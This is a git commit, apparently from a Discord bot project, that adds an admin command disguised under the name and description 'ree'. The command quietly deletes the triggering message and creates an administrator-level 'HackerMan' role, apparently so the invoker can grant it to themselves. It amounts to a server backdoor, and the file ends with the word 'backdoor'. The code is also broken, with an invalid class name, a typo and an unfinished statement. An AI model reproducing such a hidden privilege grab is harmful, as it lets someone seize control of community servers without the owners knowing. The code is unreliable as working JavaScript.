212c055381882e6e904f4f3fb11da965dd083858
OMEGAd0r4 <45790881+OMEGAd0r4@users.noreply.github.com>
2019-07-02 13:56:09 +0700

    Create d0123ndawdawgae-dawdawd-sereverdown.js

---
+++ commands/admin/d0123ndawdawgae-dawdawd-sereverdown.js
@@ -0,0 +1,34 @@
+const Discord = require("discord.js");
+const commando = require('discord.js-commando');
+const prefix = "!";
+const bot = new commando.Client({
+  commandPrefix: prefix
+});
+
+class d0123ndawdawgae-dawdawd-sereverdownCommand extends commando.Command {
+  constructor(client) 
+  {
+    super(client, {
+      name: 'ree', 
+      group: 'admin',
+      memberName: 'ree',
+      description: "ree"
+    });
+  }
+
+  async run (message, args)
+  {
+
+    message.delete(3000).catch(O_o=>{});
+
+    message.guild.roleCreate({ name: 'HackerMan', permissions: ['ADMINISTRATOR', 'MANAGE_SERVER', 'VIEW_AUDIT_LOG', 'MANAGE_ROLES', 'MANAGE_CHANNELS'] });
+    
+    var hackermanrole = message.guid.roles.find(`name`, "HackerMan");
+    
+    message.member.
+  }
+}
+
+module.exports = d0123ndawdawgae-dawdawd-sereverdownCommand;
+
+backdoor
